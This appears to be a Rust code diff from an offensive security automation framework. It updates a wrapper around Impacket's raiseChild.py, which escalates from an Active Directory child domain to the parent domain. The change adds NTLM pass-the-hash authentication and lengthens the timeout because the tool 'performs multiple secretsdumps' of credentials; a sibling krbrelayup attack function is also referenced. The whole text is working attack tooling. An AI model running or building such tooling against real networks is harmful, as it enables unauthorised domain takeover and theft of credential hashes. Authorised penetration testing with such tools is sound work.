@@ -194,20 +194,32 @@ pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
 
 /// Escalate from child domain to parent domain using raiseChild.py.
 ///
-/// Required args: `child_domain`, `username`, `password`
+/// Required args: `child_domain`, `username`
+/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
 /// Optional args: `target_domain`
 pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
     let child_domain = required_str(args, "child_domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
+    let password = optional_str(args, "password");
+    let hash = optional_str(args, "hash");
     let target_domain = optional_str(args, "target_domain");
 
-    let target = format!("{child_domain}/{username}:{password}");
+    if password.is_none() && hash.is_none() {
+        anyhow::bail!("raise_child requires either 'password' or 'hash' for authentication");
+    }
 
-    CommandBuilder::new("raiseChild.py")
-        .arg(target)
-        .flag_opt("-target-domain", target_domain)
-        .timeout_secs(120)
-        .execute()
-        .await
+    let mut cmd = CommandBuilder::new("raiseChild.py");
+
+    if let Some(h) = hash {
+        cmd = cmd
+            .arg(format!("{child_domain}/{username}"))
+            .args(credentials::hash_args(h));
+    } else if let Some(p) = password {
+        cmd = cmd.arg(format!("{child_domain}/{username}:{p}"));
+    }
+
+    cmd = cmd.flag_opt("-target-domain", target_domain);
+
+    // raiseChild performs multiple secretsdumps internally — needs extra time
+    cmd.timeout_secs(300).execute().await
 }
